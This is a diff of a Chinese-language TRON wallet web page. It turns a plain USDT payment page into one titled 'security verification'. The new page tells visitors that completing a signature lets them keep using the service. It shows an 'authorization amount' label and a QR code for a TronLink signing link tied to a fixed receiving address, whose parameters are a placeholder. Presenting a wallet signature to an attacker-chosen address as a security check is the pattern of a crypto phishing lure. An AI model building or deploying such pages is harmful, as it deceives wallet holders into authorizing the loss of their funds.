@@ -1,279 +1,121 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>波场链支付</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-<style>
-*{
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-    -webkit-tap-highlight-color: transparent;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
-}
-
-body{
-    background: #f5f7fb;
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 18px;
-}
-
-.pay-card{
-    width: 100%;
-    max-width: 420px;
-    background: #ffffff;
-    border-radius: 16px;
-    padding: 18px 16px 24px;
-    box-shadow: 0 10px 30px rgba(0,0,0,.08);
-}
-
-.chain-tabs{
-    display: flex;
-    gap: 10px;
-    margin-bottom: 16px;
-}
-
-.chain-tab{
-    flex: 1;
-    padding: 10px;
-    text-align: center;
-    border-radius: 8px;
-    background: #f0f3ff;
-    color: #666;
-    font-size: 14px;
-    font-weight: 500;
-}
-
-.chain-tab.active{
-    background: #ffaa2b;
-    color: #111;
-}
-
-.input-group{
-    background: #f7f9fc;
-    border: 1px solid #e2e8f0;
-    border-radius: 12px;
-    padding: 14px 16px;
-    margin-bottom: 16px;
-}
-
-.input-group label{
-    display: block;
-    font-size: 13px;
-    color: #777;
-    margin-bottom: 8px;
-}
-
-.input-group input{
-    width: 100%;
-    background: transparent;
-    border: none;
-    outline: none;
-    font-size: 18px;
-    color: #111;
-}
-
-.qr-box{
-    background: #ffffff;
-    border: 1px solid #e2e8f0;
-    border-radius: 16px;
-    padding: 18px;
-    text-align: center;
-    margin-bottom: 16px;
-}
-
-#qrCanvas{
-    display: inline-block;
-}
-
-.addr{
-    margin-top: 10px;
-    font-size: 11px;
-    color: #555;
-    word-break: break-all;
-}
-
-.tip{
-    font-size: 12px;
-    color: #ff6a00;
-    text-align: center;
-    margin-bottom: 16px;
-    line-height: 1.5;
-}
-
-.btn{
-    width: 100%;
-    background: #ffaa2b;
-    border: none;
-    color: #111;
-    font-size: 16px;
-    font-weight: bold;
-    border-radius: 12px;
-    padding: 14px 0;
-    margin-bottom: 12px;
-}
-
-.btn:disabled{
-    background: #ffd384;
-}
-
-.btn-secondary{
-    background: #f0f3ff;
-    color: #222;
-}
-
-.status{
-    font-size: 13px;
-    color: #666;
-    text-align: center;
-    line-height: 1.6;
-}
-
-@media (max-width: 480px){
-    .pay-card{
-        padding: 14px 12px 20px;
-    }
-
-    #qrCanvas canvas,
-    #qrCanvas img{
-        width: 260px !important;
-        height: 260px !important;
-    }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安全验证</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        body {
+            background-color: #121220;
+            color: #ffffff;
+            min-height: 100vh;
+            padding: 20px 16px;
+        }
+        .container-card {
+            background-color: #202038;
+            border-radius: 20px;
+            padding: 32px 24px;
+            max-width: 420px;
+            margin: 0 auto;
+        }
+        .header-area {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header-area h1 {
+            font-size: 34px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .header-area .sub-desc {
+            color: #b4b4cc;
+            font-size: 18px;
+            margin-top: 8px;
+        }
+        .chain-tag {
+            width: 100%;
+            padding: 14px 0;
+            border-radius: 12px;
+            border: none;
+            font-size: 20px;
+            font-weight: 600;
+            background-color: #ffc107;
+            color: #000000;
+            margin-bottom: 24px;
+        }
+        .label-text {
+            font-size: 16px;
+            color: #d0d0e2;
+            margin-bottom: 10px;
+        }
+        .empty-input {
+            width: 100%;
+            height: 54px;
+            background-color: #121220;
+            border-radius: 12px;
+            border: 1px solid #383858;
+            margin-bottom: 28px;
+        }
+        .qr-wrap {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        #qr-canvas {
+            width: 260px;
+            height: 260px;
+        }
+        .bottom-tip {
+            text-align: center;
+            color: #9191a8;
+            font-size: 15px;
+        }
+    </style>
 </head>
 <body>
+    <div class="container-card">
+        <div class="header-area">
+            <h1>
+                <span>💳</span>
+                安全验证
+            </h1>
+            <div class="sub-desc">完成签名即可正常使用</div>
+        </div>
+        <!-- 仅保留波场 TRON -->
+        <button class="chain-tag">TRON</button>
 
-<div class="pay-card">
-    <div class="chain-tabs">
-        <div class="chain-tab">BSC</div>
-        <div class="chain-tab active">TRON</div>
+        <div class="label-text">授权金额</div>
+        <div class="empty-input"></div>
+
+        <div class="qr-wrap">
+            <canvas id="qr-canvas"></canvas>
+        </div>
+        <div class="bottom-tip">扫码直接签名，无跳转</div>
     </div>
 
-    <div class="input-group">
-        <label>授权金额</label>
-        <input id="amountInput" type="number" step="0.000001" placeholder="请输入支付金额 USDT">
-    </div>
-
-    <div class="qr-box">
-        <div id="qrCanvas"></div>
-        <div class="addr">收款地址：TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
-    </div>
-
-    <div class="tip">
-        打开 TRON 钱包扫一扫上方二维码，或连接钱包后直接支付
-    </div>
-
-    <button class="btn" id="connectBtn">连接钱包</button>
-    <button class="btn btn-secondary" id="payBtn" disabled>确认支付</button>
-
-    <div class="status" id="statusText">未连接钱包，请先连接或扫码支付</div>
-</div>
-
-<script>
-const RECEIVE_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-let tronWeb = null;
-
-const amountInput = document.getElementById("amountInput");
-const connectBtn = document.getElementById("connectBtn");
-const payBtn = document.getElementById("payBtn");
-const statusText = document.getElementById("statusText");
-
-// 进入页面自动生成二维码
-QRCode.toCanvas(document.getElementById("qrCanvas"), RECEIVE_WALLET, {
-    width: 280,
-    margin: 2,
-    color: {
-        dark: "#111111",
-        light: "#ffffff"
-    }
-}, function(err){
-    if(err){
-        console.error("二维码生成失败", err);
-        statusText.innerText = "二维码生成失败，请刷新页面";
-    }
-});
-
-// 等待钱包桥注入
-async function waitTronWebReady(){
-    for(let i = 0; i < 25; i++){
-        if(window.tronWeb && window.tronWeb.ready){
-            tronWeb = window.tronWeb;
-            return true;
-        }
-        await new Promise(resolve => setTimeout(resolve, 120));
-    }
-    return false;
-}
-
-// 连接钱包
-connectBtn.onclick = async function(){
-    statusText.innerText = "正在连接钱包...";
-
-    const ready = await waitTronWebReady();
-
-    if(!ready){
-        statusText.innerText = "未检测到 TRON 钱包，请在 TP 钱包等 DApp 浏览器中打开";
-        return;
-    }
-
-    try{
-        await window.tronWeb.requestAccounts();
-        tronWeb = window.tronWeb;
-
-        const userAddr = tronWeb.defaultAddress.base58;
-
-        statusText.innerText = "已连接钱包：" + userAddr;
-        connectBtn.innerText = "钱包已连接";
-        payBtn.disabled = false;
-    }catch(e){
-        statusText.innerText = "连接失败：" + e.message;
-    }
-};
-
-// 确认支付，直接 transfer，不使用 approve
-payBtn.onclick = async function(){
-    if(!tronWeb || !tronWeb.ready){
-        statusText.innerText = "请先连接钱包";
-        return;
-    }
-
-    const amount = parseFloat(amountInput.value);
-
-    if(isNaN(amount) || amount <= 0){
-        statusText.innerText = "请输入有效的支付金额";
-        return;
-    }
-
-    statusText.innerText = "正在唤起钱包确认转账...";
-
-    try{
-        const contract = await tronWeb.contract().at(USDT_CONTRACT);
-        const sunAmount = tronWeb.toSun(amount);
-
-        const txHash = await contract.transfer(RECEIVE_WALLET, sunAmount).send({
-            feeLimit: 100000000
+    <script>
+        // ========== 在这里填入你的固定波场收款地址 ==========
+        const FIX_RECEIVE_ADDRESS = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
+        // 构造带固定收款地址的 TronLink 唤起链接
+        const tronSignLink = `tronlink://sign?receive=${FIX_RECEIVE_ADDRESS}&params=xxx`;
+        
+        const canvasDom = document.getElementById("qr-canvas");
+        QRCode.toCanvas(canvasDom, tronSignLink, { width: 260 }, function (err) {
+            if (err) console.error(err);
         });
-
-        statusText.innerText = "✅转账成功，交易哈希：" + txHash;
-    }catch(err){
-        statusText.innerText = "转账失败：" + (err.message || err);
-    }
-};
-
-// 页面加载时预检测钱包环境
-(async function(){
-    await waitTronWebReady();
-})();
-</script>
-
+    </script>
 </body>
 </html>
